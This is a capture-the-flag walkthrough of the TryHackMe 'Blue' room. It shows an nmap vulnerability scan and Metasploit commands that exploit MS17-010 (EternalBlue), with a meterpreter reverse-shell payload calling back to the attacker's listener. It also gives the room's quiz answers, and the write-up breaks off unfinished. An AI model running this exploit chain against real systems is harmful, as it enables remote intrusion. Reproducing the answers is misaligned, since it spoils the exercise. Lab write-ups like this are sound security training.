
# TryHackMe Blue Walkthrough (MS17-010 Exploitation)   

[TOC]

# Blue walkthrough link

<!-- Put the link to this slide here so people can follow -->
Machine: https://tryhackme.com/room/blue?ref=blog.tryhackme.com

---

## ``nmap`` scan

---

```
nmap -sV -vv --script vuln 10.10.53.191
```

**``output:``**

```
PORT      STATE    SERVICE        REASON          VERSION
70/tcp    filtered gopher         no-response
119/tcp   filtered nntp           no-response
135/tcp   open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds   syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
616/tcp   filtered sco-sysmgr     no-response
1029/tcp  filtered ms-lsa         no-response
1080/tcp  filtered socks          no-response
1091/tcp  filtered ff-sm          no-response
1163/tcp  filtered sddp           no-response
1755/tcp  filtered wms            no-response
2401/tcp  filtered cvspserver     no-response
3389/tcp  open     tcpwrapped     syn-ack ttl 127
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
4005/tcp  filtered pxc-pin        no-response
4550/tcp  filtered gds-adppiw-db  no-response
4899/tcp  filtered radmin         no-response
5907/tcp  filtered dsd            no-response
6002/tcp  filtered X11:2          no-response
6547/tcp  filtered powerchuteplus no-response
14238/tcp filtered unknown        no-response
44176/tcp filtered unknown        no-response
49152/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49161/tcp filtered unknown        no-response
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers 🟥(ms17-010).🟥
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.14 seconds
           Raw packets sent: 1086 (47.760KB) | Rcvd: 983 (39.344KB)
 

```

so we found that the vulnrability on (ms17-010)

 : :info
  ******Recon Questions answer****** :heavy_check_mark: 
 : :
>[color=red]
>>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
> [color=red]

**``answer:``**

```
no answer needed
```
>[color=red]
>>How many ports are open with a port number under 1000?
[color=red]

**``
answer:
``**

```
3
```

>[color=red]
>>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
>[color=red]

**``
answer:
``**

```
ms17-010
```

---

## ``start`` <span style="color:red; font-weight:bold;background-color:yellow;border-radius:5px;padding:5px;">metasploit</span>
---

### start metasploit:
```
msfconsole
```
after that we will search for exploits to this vulnaribility.
### **search** about our vuln:

```
search ms17-010
```
``output:``
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

after that we will ***use*** the first exploit:
### use exploit

```
use exploit/windows/smb/ms17_010_eternalblue
```
after that we need to see ***options*** : 
### show options
```
show options
```
``output`` : 
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines
                                             .
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     ** YOUR_IP **    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

we found that RHOSTS reqiured << yes >>
now we will make RHOSTS to our thm machine ip. 
: :warning
make sure that LHOST is set to your tun0 ip.
: :

### set RHOSTS:

```
 set RHOSTS 10.10.53.191    # MACHINE ip
 set LHOST  10.0.55.78      # YOUR device ip
```
* and now we ready to do exploit.

### exploit:

```
exploit
```
``or``
```
run
```
---

```
[*] Meterpreter session 1 opened (10.8.47.102:4444 -> 10.10.32.90:49197) at 2025-03-11 01:04:33 -0400
[+] 10.10.32.90:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.32.90:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.32.90:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

```

: :info
**Gain Access Questions answers:** :heavy_check_mark:
: : 
>[color=#0fa0e0]
>>*Start Metasploit*
>>[color=red]

``
answer:
``

```
no answer needed
```
>[color=#0fa0e0]
>>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
>>[color=red]

``
answer:
``

```
exploit/windows/smb/ms17_010_eternalblue
```
>[color=#0fa0e0]
>>Show options and set the one required value. What is the name of this value? (All caps for submission)
[color=red]

``
answer:
``

```
RHOSTS
```
>[color=#0fa0e0]
>>run the exploit!
[color=red]

``
answer:
``
```
no answer needed
```
>[color=#0fa0e0]
>>Confirm that the exploit has run correctly
[color=red]

``
answer:
``
```
no answer needed
```

---
: :info
**Escalate Questions answers:** :heavy_check_mark:
: : 

>[color=#0fa0e0]
>>* What is the name of the post module we will use?*
>>[color=red]

``
answer:
``

```
post/multi/manage/shell_to_meterpreter
```

>[color=#0fa0e0]
>>* Select this (use MODULE_PATH). Show options, what option are we required to change?*
>>[color=red]

``
answer:
``

```
session
```

---
: :info
**Cracking Questions answers:** :heavy_check_mark:
: : 

search -f flag*.txt

![image](https://github.com/user-attachments/assets/66f739bb-29ed-4c66-9cae-e7628ab4180d)

: :danger
# completeing solution soon ....
: :
>[color=red][name=Frankishtien][time=Sun, Jun 28, 2015 10:00 PM]
>thanks to see my writeup

---

## Who am I?

- Hacker
- Hacker :heart: 
- Hacker :cat: 

---

### Thank you! :sheep: 

You can find me on

- GitHub
- Twitter
- or email me

